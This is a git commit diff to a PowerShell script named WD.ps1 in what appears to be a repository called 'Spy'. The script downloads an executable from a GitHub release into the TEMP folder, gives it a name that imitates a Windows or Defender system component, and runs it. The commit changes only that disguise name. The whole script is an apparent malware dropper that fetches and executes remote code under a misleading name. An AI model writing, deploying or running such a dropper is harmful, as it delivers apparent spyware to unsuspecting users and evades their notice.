0753d605647f9c62649be45fcb113d3b03fbdc2d
ertvg <simjkl@hotmail.fr>
2025-07-03 13:54:29 +0200

    Update WD.ps1

--- WD.ps1
+++ WD.ps1
@@ -1,3 +1,3 @@
-$path = "$env:TEMP\Windows.Defender.AVC.exe"
+$path = "$env:TEMP\System.AVC.exe"
 Invoke-WebRequest -Uri "https://github.com/ertvg/Spy/releases/download/v1/Windows.Defender.AVC.exe" -OutFile $path
 Start-Process $path
